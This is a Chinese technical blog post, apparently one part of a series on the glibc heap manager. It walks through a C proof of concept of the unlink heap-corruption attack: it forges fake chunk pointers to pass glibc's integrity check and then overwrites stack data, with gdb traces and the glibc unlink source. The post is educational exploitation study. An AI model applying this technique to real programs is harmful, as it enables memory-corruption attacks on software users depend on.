<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>关于如何理解Glibc堆管理器(Ⅳ——从Unlink攻击理解指针与chunk寻址方式) | TokameinE - 雨声淅淅沥沥，犬吠永不止息</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: Bender;
 src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
}
@font-face {
 font-family: BenderLight;
 src: local('BenderLight'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('/img/bg.jpg');
  --light-background: url('/img/91110244_p0.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li><li class="navItem"><a class="navBlock" href="/links/"><span class="navItemTitle">Links</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>关于如何理解Glibc堆管理器(Ⅳ——从Unlink攻击理解指针与chunk寻址方式)</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2021-08-07T12:18:10.000Z" id="date"> 2021-08-07</time></div></span><br><span>Last Update: <div class="control"><time datetime="2024-12-29T04:50:34.993Z" id="updated"> 2024-12-29</time></div></span></div></div><hr><div id="post-content"><p>​</p>
<p> 本篇实为个人笔记，可能存在些许错误；若各位师傅发现哪里存在错误，还望指正。感激不尽。</p>
<p>若有图片及文稿引用，将在本篇结尾处著名来源。</p>
<h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p>        在此先给出几篇可供参考的文章。笔者认为几位师傅所写的都比笔者所写要来得更加精炼。倘若您通过如下几篇文章已经能够完全理解Unlink为何，那么大可以不再阅读这篇冗长的文章。</p>
<p> <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/197481">安全客：https://www.anquanke.com/post/id/197481</a></p>
<p> <a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-224836.htm">看雪：https://bbs.pediy.com/thread-224836.htm</a></p>
<p> <a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unlink/">CTF-WIKI：https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unlink/</a></p>
<h2 id="环境与工具："><a href="#环境与工具：" class="headerlink" title="环境与工具："></a>环境与工具：</h2><p>        环境：Ubuntu16.4 &#x2F; gcc &#x2F; (gdb)pwn-dbg</p>
<p>        范例：Heap Exploitation系列unlink部分(源代码将直接在下面贴出)</p>
<h2 id="源代码："><a href="#源代码：" class="headerlink" title="源代码："></a>源代码：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;unistd.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;stdio.h&gt;<br> <br>struct chunk_structure &#123;<br>  size_t prev_size;<br>  size_t size;<br>  struct chunk_structure *fd;<br>  struct chunk_structure *bk;<br>  char buf[10];               // padding<br>&#125;;<br> <br>int main() &#123;<br>  unsigned long long *chunk1, *chunk2;<br>  struct chunk_structure *fake_chunk, *chunk2_hdr;<br>  char data[20];<br> <br>  // First grab two chunks (non fast)<br>  chunk1 = malloc(0x80);<br>  chunk2 = malloc(0x80);<br>  printf(&quot;%p\n&quot;, &amp;chunk1);<br>  printf(&quot;%p\n&quot;, chunk1);<br>  printf(&quot;%p\n&quot;, chunk2);<br> <br>  // Assuming attacker has control over chunk1&#x27;s contents<br>  // Overflow the heap, override chunk2&#x27;s header<br> <br>  // First forge a fake chunk starting at chunk1<br>  // Need to setup fd and bk pointers to pass the unlink security check<br>  fake_chunk = (struct chunk_structure *)chunk1;<br>  fake_chunk-&gt;fd = (struct chunk_structure *)(&amp;chunk1 - 3); // Ensures P-&gt;fd-&gt;bk == P<br>  fake_chunk-&gt;bk = (struct chunk_structure *)(&amp;chunk1 - 2); // Ensures P-&gt;bk-&gt;fd == P<br> <br>  // Next modify the header of chunk2 to pass all security checks<br>  chunk2_hdr = (struct chunk_structure *)(chunk2 - 2);<br>  chunk2_hdr-&gt;prev_size = 0x80;  // chunk1&#x27;s data region size<br>  chunk2_hdr-&gt;size &amp;= ~1;        // Unsetting prev_in_use bit<br> <br>  // Now, when chunk2 is freed, attacker&#x27;s fake chunk is &#x27;unlinked&#x27;<br>  // This results in chunk1 pointer pointing to chunk1 - 3<br>  // i.e. chunk1[3] now contains chunk1 itself.<br>  // We then make chunk1 point to some victim&#x27;s data<br>  free(chunk2);<br>  printf(&quot;%p\n&quot;, chunk1);<br>  printf(&quot;%p\n&quot;, chunk1[3]);<br> <br>  chunk1[3] = (unsigned long long)data;<br> <br>  strcpy(data, &quot;Victim&#x27;s data&quot;);<br> <br>  // Overwrite victim&#x27;s data using chunk1<br>  chunk1[0] = 0x002164656b636168LL;<br> <br>  printf(&quot;%s\n&quot;, data);<br> <br>  return 0;<br>&#125;<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/b92b71a2-45c5-4217-9559-0a7062d65341'><img src="blob:https://tokameine.top/b92b71a2-45c5-4217-9559-0a7062d65341"></p>
<h2 id="代码调试："><a href="#代码调试：" class="headerlink" title="代码调试："></a>代码调试：</h2><p>        读者可以试着先行阅读一下代码，看看是否能够理解其逻辑。笔者在调试时由于对指针和寻址等相关知识的不熟练而倍感困惑，倘若读者在阅读代码过程中通畅无阻，那么这个案例便不是那么困难了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">gdb-peda$ b 20<br>Breakpoint 1 at 0x40067d: file test.c, line 20.<br>gdb-peda$ b 31<br>Breakpoint 2 at 0x4006db: file test.c, line 31.<br>gdb-peda$ b 36<br>Breakpoint 3 at 0x400703: file test.c, line 36.<br>gdb-peda$ b 44<br>Breakpoint 4 at 0x400731: file test.c, line 44.<br>gdb-peda$ run<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/9a329ddd-2cad-453a-8730-6c1f191c5f1e'><img src="blob:https://tokameine.top/9a329ddd-2cad-453a-8730-6c1f191c5f1e"></p>
<p>        首先开辟三个chunk，这此我们有必要记录一下打印得到的结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">gdb-peda$ continue<br>Continuing.<br>0x7fffffffde00    //chunk1指针地址<br>0x602010    //chunk1堆地址——user data<br>0x6020a0    //chunk2堆地址——user data<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/d6e3fa96-d784-4950-9f31-6ba310cebfe9'><img src="blob:https://tokameine.top/d6e3fa96-d784-4950-9f31-6ba310cebfe9"></p>
<p>        继续continue直到第36行，查看此时的heap</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0x602000 PREV_INUSE &#123;<br>  prev_size = 0x0, <br>  size = 0x91, <br>  fd = 0x0, <br>  bk = 0x0, <br>  fd_nextsize = 0x7fffffffdde8, <br>  bk_nextsize = 0x7fffffffddf0<br>&#125;<br>0x602090 PREV_INUSE &#123;<br>  prev_size = 0x0, <br>  size = 0x91, <br>  fd = 0x0, <br>  bk = 0x0, <br>  fd_nextsize = 0x0, <br>  bk_nextsize = 0x0<br>&#125;<br>0x602120 PREV_INUSE &#123;<br>  prev_size = 0x0, <br>  size = 0x411, <br>  fd = 0x3061303230367830, <br>  bk = 0xa30306564660a, <br>  fd_nextsize = 0x0, <br>  bk_nextsize = 0x0<br>&#125;<br>0x602530 PREV_INUSE &#123;<br>  prev_size = 0x0, <br>  size = 0x20ad1, <br>  fd = 0x0, <br>  bk = 0x0, <br>  fd_nextsize = 0x0, <br>  bk_nextsize = 0x0<br>&#125;<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/7461c57d-29ad-41d5-81b4-a6aa4f3592fb'><img src="blob:https://tokameine.top/7461c57d-29ad-41d5-81b4-a6aa4f3592fb"></p>
<p>        我们发现，chunk 1的 fd 和 bk 指针已经被指向了栈的地方。 </p>
<p>        先抛开这究竟是如何实现的，我们需要先了解一下</p>
<h3 id="什么是Unlink："><a href="#什么是Unlink：" class="headerlink" title="什么是Unlink："></a><strong>什么是Unlink：</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1459 /* Take a chunk off a bin list.  */<br>1460 static void<br>1461 unlink_chunk (mstate av, mchunkptr p)<br>1462 &#123;<br>1463   if (chunksize (p) != prev_size (next_chunk (p)))<br>1464     malloc_printerr (&quot;corrupted size vs. prev_size&quot;);<br>1465 <br>1466   mchunkptr fd = p-&gt;fd;<br>1467   mchunkptr bk = p-&gt;bk;<br>1468 <br>1469   if (__builtin_expect (fd-&gt;bk != p  bk-&gt;fd != p, 0))<br>1470     malloc_printerr (&quot;corrupted double-linked list&quot;);<br>1471 <br>1472   fd-&gt;bk = bk;<br>1473   bk-&gt;fd = fd;<br>1474   if (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != NULL)<br>1475     &#123;<br>1476       if (p-&gt;fd_nextsize-&gt;bk_nextsize != p<br>1477            p-&gt;bk_nextsize-&gt;fd_nextsize != p)<br>1478         malloc_printerr (&quot;corrupted double-linked list (not small)&quot;);<br>1479 <br>1480       if (fd-&gt;fd_nextsize == NULL)<br>1481         &#123;<br>1482           if (p-&gt;fd_nextsize == p)<br>1483             fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;<br>1484           else<br>1485             &#123;<br>1486               fd-&gt;fd_nextsize = p-&gt;fd_nextsize;<br>1487               fd-&gt;bk_nextsize = p-&gt;bk_nextsize;<br>1488               p-&gt;fd_nextsize-&gt;bk_nextsize = fd;<br>1489               p-&gt;bk_nextsize-&gt;fd_nextsize = fd;<br>1490             &#125;<br>1491         &#125;<br>1492       else<br>1493         &#123;<br>1494           p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;<br>1495           p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;<br>1496         &#125;<br>1497     &#125;<br>1498 &#125;<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/88b73069-e770-4748-b917-1b2bf08f1a05'><img src="blob:https://tokameine.top/88b73069-e770-4748-b917-1b2bf08f1a05"></p>
<p>        Unlink实则为一个函数，在特定情况下被调用。函数功能为：<strong>将一个chunk从链表中摘下</strong></p>
<p>        这里所说的链表，其实就是Bins结构。</p>
<p>        这里引用一下<strong>知世</strong>师傅的总结：</p>
<p><strong>使用unlink的时机</strong></p>
<ul>
<li>malloc<ol>
<li>在恰好大小的large chunk处取chunk时</li>
<li>在比请求大小大的bin中取chunk时</li>
</ol>
</li>
<li>Free<ol>
<li>后向合并,合并物理相邻低物理地址空闲chunk时</li>
<li>前向合并,合并物理相邻高物理地址空闲chunk时(top chunk除外)</li>
</ol>
</li>
<li>malloc_consolidate<ol>
<li>后向合并,合并物理相邻低地址空闲chunk时。</li>
<li>前向合并，合并物理相邻高地址空闲 chunk时（top chunk除外）</li>
</ol>
</li>
<li>realloc <code>前向扩展，合并物理相邻高地址空闲 chunk（除了top chunk）</code class='item-img' data-src='blob:https://tokameine.top/a9be6edd-3a7e-4d46-ac77-3e875f1b0b4b'><img src="blob:https://tokameine.top/a9be6edd-3a7e-4d46-ac77-3e875f1b0b4b"></li>
</ul>
<p>        其具体的执行效果一言蔽之就是：(P为链表中需要被摘下的节点)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">P-&gt;fd-&gt;bk = P-&gt;bk.<br>P-&gt;bk-&gt;fd = P-&gt;fd.<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/e9c197e7-fa70-4e56-bdfd-f6da3b8125c3'><img src="blob:https://tokameine.top/e9c197e7-fa70-4e56-bdfd-f6da3b8125c3"></p>
<p>        本章我们将以Free时候发生Unlink来示范，看看堆管理器究竟在做些什么。</p>
<h3 id="调试继续："><a href="#调试继续：" class="headerlink" title="调试继续："></a>调试继续：</h3><p>        我们查看一下两个指针的地址，并在图中标出：(不要过于纠结fake_chunk名字的意义)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">gdb-peda$ p fake_chunk <br>$1 = (struct chunk_structure *) 0x602010<br>gdb-peda$ p &amp;fake_chunk <br>$2 = (struct chunk_structure **) 0x7fffffffde10<br>gdb-peda$ p &amp;chunk1 <br>$3 = (unsigned long long **) 0x7fffffffde00<br>gdb-peda$ p &amp;data<br>$4 = (char (*)[20]) 0x7fffffffde20<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/93fade5b-9e76-415d-89b2-d715bbd028e5'><img src="blob:https://tokameine.top/93fade5b-9e76-415d-89b2-d715bbd028e5"></p>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/20210801164858129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1Rva2FtZWluZQ==,size_16,color_FFFFFF,t_70'><img src="https://img-blog.csdnimg.cn/20210801164858129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1Rva2FtZWluZQ==,size_16,color_FFFFFF,t_70">​<img src="blob:https://tokameine.top/141881c4-e631-47ae-8ace-f687e5bd9205"></p>
<p>         第32，33行的两行代码，我将其地址标注在上图中了。值得注意的是，这两个指针均为<strong>“指向chunk”</strong>的指针，即——将 <strong>&amp;chunk1-3</strong> 与 <strong>&amp;chunk1-2</strong> 视为了两个<strong>不同的chunk</strong></p>
<h3 id="Unlink安全性检查："><a href="#Unlink安全性检查：" class="headerlink" title="Unlink安全性检查："></a><strong>Unlink安全性检查：</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// fd bk<br>if (__builtin_expect (FD-&gt;bk != P  BK-&gt;fd != P, 0))                      \<br>  malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  \<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/b5680919-c3d2-4fae-8b99-2b7db2c4e1c0'><img src="blob:https://tokameine.top/b5680919-c3d2-4fae-8b99-2b7db2c4e1c0"></p>
<p>        由于这个检查，因此才有上面的伪造。</p>
<p>        现在，不妨跟随一下这个检查，其要求为：(P为链表中需要被摘下的节点,此处是chunk1)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">P-&gt;fd-&gt;bk == P<br>P-&gt;bk-&gt;fd == P<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/1425e351-deed-4af3-bde6-10895981bd3c'><img src="blob:https://tokameine.top/1425e351-deed-4af3-bde6-10895981bd3c"></p>
<p>         chunk1-&gt;fd&#x3D;&amp;chunk1-3，根据上面的栈表，我们可以轻松的发现：chunk1-&gt;fd-&gt;bk&#x3D;602010</p>
<p>        对于另外一个判断也是如此。我们成功的**将 栈 伪造成了两个chunk(fd和bk)**来骗过了管理器。</p>
<h3 id="调试继续：-1"><a href="#调试继续：-1" class="headerlink" title="调试继续："></a>调试继续：</h3><p>         因为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">fake_chunk = (struct chunk_structure *)chunk1;<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/b0040bc4-33d0-44cb-b821-c5bb0d76a08f'><img src="blob:https://tokameine.top/b0040bc4-33d0-44cb-b821-c5bb0d76a08f"></p>
<p>         因此，我们操作fake_chunk的fd&#x2F;bk指针就是操作chunk1的对应指针，于是才有了前面给出的堆的状态。</p>
<p>        继续调试，从第36行到44行。</p>
<p>        chunk2_hdr是指向chunk2真正的开头的指针。在第二章中曾提到过，malloc返回的内容并不是真正指向chunk的开头，而是往下增加了16字节。</p>
<p>        第37和38行则是在伪造chunk1的状态：</p>
<p>        prev_size表示上一个相邻空闲块的大小(若该相邻块是被使用的，则会被占用，用来填充用户数据)，第38行则将P标记位置0，表示上一个相邻块已被释放。</p>
<p>        至此，我们已经伪造好了chunk1的状态。当使用free(chunk2)的时候，管理器会发现chunk1是处于被释放状态的，于是将chunk2和chunk1进行合并。</p>
<h3 id="Free与触发Unlink："><a href="#Free与触发Unlink：" class="headerlink" title="Free与触发Unlink："></a>Free与触发Unlink：</h3><p>        当我们执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">free(chunk2);<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/574ffdd9-29dd-4b91-8182-3a38771f004a'><img src="blob:https://tokameine.top/574ffdd9-29dd-4b91-8182-3a38771f004a"></p>
<p>        时候将触发Unlink，对chunk1做如下行为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">P-&gt;fd-&gt;bk = P-&gt;bk.<br>P-&gt;bk-&gt;fd = P-&gt;fd.<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/6c45c50d-88ab-4b0c-a0d0-0c18b673e0e0'><img src="blob:https://tokameine.top/6c45c50d-88ab-4b0c-a0d0-0c18b673e0e0"></p>
<p>        结果是令人疑惑的，但如果按照笔者上述的逻辑，大致还是能够理顺的：(P为chunk1)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&amp;(P-&gt;fd-&gt;bk)=0x7fffffffde10<br>该地址处的内容被替换为(&amp;chunk1-2)=0x7fffffffddf0<br>&amp;(P-&gt;bk-&gt;fd)=0x7fffffffde10<br>该地址处的内容被替换为(&amp;chunk1-3)=0x7fffffffdde8<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/035c162b-b3b7-4c55-9571-e7303e696b84'><img src="blob:https://tokameine.top/035c162b-b3b7-4c55-9571-e7303e696b84"></p>
<p>         现在我们再看chunk1与chunk[3]，将得到相同的结果：</p>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/20210801172933656.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1Rva2FtZWluZQ==,size_16,color_FFFFFF,t_70'><img src="https://img-blog.csdnimg.cn/20210801172933656.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1Rva2FtZWluZQ==,size_16,color_FFFFFF,t_70">​<img src="blob:https://tokameine.top/d0e9fe39-d668-461d-81da-2353cd611da2"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">gdb-peda$ p chunk1<br>$16 = (unsigned long long *) 0x7fffffffdde8<br>gdb-peda$ p &amp;chunk1[3]<br>$17 = (unsigned long long *) 0x7fffffffde00<br>gdb-peda$ p chunk1[3]<br>$18 = 0x7fffffffdde8<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/d4465747-637d-45d7-83b2-0a014cf0cc03'><img src="blob:https://tokameine.top/d4465747-637d-45d7-83b2-0a014cf0cc03"></p>
<p>         “chunk1的内容和chunk1[3]相同，chunk1[3]的地址和chunk1的地址相同”，乍一看相当反直觉的表述，但根据栈图还是能够理解的，继续往下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">chunk1[3] = (unsigned long long)data;<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/dbc07470-e868-415b-96c5-22c4d0f40358'><img src="blob:https://tokameine.top/dbc07470-e868-415b-96c5-22c4d0f40358"></p>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/20210801173530499.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1Rva2FtZWluZQ==,size_16,color_FFFFFF,t_70'><img src="https://img-blog.csdnimg.cn/20210801173530499.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1Rva2FtZWluZQ==,size_16,color_FFFFFF,t_70">​<img src="blob:https://tokameine.top/6af888c1-81ec-4268-bcd3-be53abfd3baa"></p>
<p>        此时，该操作就会将chunk1的值替换为Data的指针。因此，只要我们能够操作chunk1的值，就变相的能够读写Data中的数据了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">chunk1[0] = 0x002164656b636168LL;<br>printf(&quot;%s\n&quot;, data);//hacked!<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/a1c07ff6-7130-4f68-9f53-8f5e676f7cba'><img src="blob:https://tokameine.top/a1c07ff6-7130-4f68-9f53-8f5e676f7cba"></p>
<h3 id="关于寻址："><a href="#关于寻址：" class="headerlink" title="关于寻址："></a>关于寻址：</h3><p>         说了这么多，最后是关于寻址的问题。</p>
<p>        上文案例中，chunk1并不在Bins中，那这个Unlink的执行会否显得有些突兀？</p>
<p>        从寻址的角度来说，管理器<strong>并不关心chunk1是否处于Bins中</strong>。它通过Size和Prev_Size来找到chunk1，并且由于chunk1的fd和bk指针都存在，管理器就误认为chunk1是被挂在Bins中的一个节点。也就是说，<strong>堆管理器并没有检查Bins中是否真的存在这个节点</strong>。</p>
<p>        实际上，即使chunk1真的是Bins中的一个节点，这种寻址方式也不会有任何问题，它会顺利的摘下chunk1；只是在本例中，管理器以为自己从Bins中摘除了chunk1罢了 ​</p>
<p>插画ID：91110244</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2021/08/07/glibc-5/">← Next 关于如何理解Glibc堆管理器(Ⅴ——从Large Bin Attack理解malloc对Bins的分配)</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2021/08/07/glibc-3/">关于如何理解Glibc堆管理器(Ⅲ——从DoubleFree深入理解Bins) Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/6.png" alt="Logo"></a><h1 id="Dr"><a href="TokameinE">TokameinE</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/ErodedElk"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" target="_blank" rel="noopener" href="https://space.bilibili.com/1782544616"><i class="fa-brands fa-bilibili" alt="BiliBili"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">参考文章：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%B7%A5%E5%85%B7%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">环境与工具：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81%EF%BC%9A"><span class="toc-number">3.</span> <span 